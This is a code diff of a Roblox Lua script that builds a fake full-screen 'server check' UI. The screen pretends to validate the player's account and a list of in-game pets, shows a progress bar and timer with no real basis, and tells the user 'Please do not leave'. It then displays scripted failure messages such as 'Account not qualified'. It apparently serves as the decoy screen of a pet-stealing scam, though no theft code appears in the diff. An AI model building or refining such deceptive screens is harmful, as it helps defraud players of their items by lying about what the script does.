@@ -1,4 +1,4 @@
--- GUI v4 - Fast Pet Check + Timer Skips (Fixed Timer + Help Button)
+-- GUI v5 - Fixed Timer + Working Help + Final Messages
 
 local gui = Instance.new("ScreenGui")
 gui.Name = "AdvanceServerUI"
@@ -76,6 +76,7 @@ petLabel.TextScaled = true
 petLabel.Text = ""
 petLabel.Parent = frame
 
+-- Help Button
 local helpButton = Instance.new("TextButton")
 helpButton.Size = UDim2.new(0, 70, 0, 30)
 helpButton.Position = UDim2.new(1, -80, 0, 10)
@@ -88,6 +89,7 @@ helpButton.ZIndex = 10
 helpButton.Parent = blackBG
 Instance.new("UICorner", helpButton).CornerRadius = UDim.new(0, 6)
 
+-- Help Popup
 local helpPopup = Instance.new("Frame")
 helpPopup.Size = UDim2.new(0.8, 0, 0.6, 0)
 helpPopup.Position = UDim2.new(0.1, 0, 0.2, 0)
@@ -106,15 +108,17 @@ helpText.TextColor3 = Color3.new(1, 1, 1)
 helpText.Font = Enum.Font.SourceSans
 helpText.TextScaled = true
 helpText.TextWrapped = true
-helpText.Text = "Fake loading screen guide... your account is being checked, pets are being validated, etc."
+helpText.Text = "Fake loading screen. Please do not leave. System is validating account, reading pet logs, and checking server assignments."
 helpText.Parent = helpPopup
 
 helpButton.MouseButton1Click:Connect(function()
     helpPopup.Visible = not helpPopup.Visible
 end)
 
+-- Timer & Logic
 local totalTime = 600
 local startTime = tick()
+local virtualElapsed = 0
 
 local pets = {"Raccoon", "Dragonfly", "Butterfly", "Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "T-Rex", "Spinosaurus"}
 
@@ -122,22 +126,27 @@ spawn(function()
     for _, pet in ipairs(pets) do
         petLabel.Text = "Checking pets: " .. pet .. "..."
         wait(30)
-        petLabel.Text = "Checking pets: " .. pet .. " -> Done!"
-        totalTime = totalTime - 30
+        petLabel.Text = "Checking pets: " .. pet .. " -> OK!"
+        virtualElapsed = virtualElapsed + 30
         wait(1)
     end
 end)
 
 spawn(function()
-    while tick() - startTime < totalTime do
-        local elapsed = tick() - startTime
+    while true do
+        local realElapsed = tick() - startTime
+        local elapsed = realElapsed + virtualElapsed
+        if elapsed >= totalTime then break end
+
         local pct = math.floor(elapsed / totalTime * 100)
         local rem = math.max(0, totalTime - elapsed)
         local min = math.floor(rem / 60)
         local sec = math.floor(rem % 60)
+
         percentLabel.Text = ("Progress: %d%%"):format(pct)
         timeLabel.Text = ("Estimated time left: %02d:%02d"):format(min, sec)
         progressFill.Size = UDim2.new(pct / 100, 0, 1, 0)
+
         wait(0.5)
     end
 end)
@@ -154,28 +163,34 @@ local messages = {
 
 spawn(function()
     local idx = 1
-    while tick() - startTime < totalTime do
+    while true do
+        if (tick() - startTime + virtualElapsed) >= totalTime then break end
         label.Text = messages[idx]
         idx = idx % #messages + 1
         wait(30)
     end
 end)
 
-delay(totalTime, function()
+spawn(function()
+    while (tick() - startTime + virtualElapsed) < totalTime do
+        wait(0.1)
+    end
+
     frame:Destroy()
+
     local resultText = Instance.new("TextLabel")
     resultText.Size = UDim2.new(1, 0, 1, 0)
-    resultText.Position = UDim2.new(0, 0, 0, 0)
     resultText.BackgroundTransparency = 1
     resultText.TextColor3 = Color3.new(1, 0, 0)
     resultText.Font = Enum.Font.SourceSansBold
     resultText.TextScaled = true
     resultText.Text = "Server cannot be found"
     resultText.Parent = blackBG
+
     wait(3)
     resultText.Text = "Account not qualified"
     wait(3)
     resultText.Text = "Required pets not found"
     wait(3)
-    resultText.Text = "Please try again"
+    resultText.Text = "Try Again"
 end)
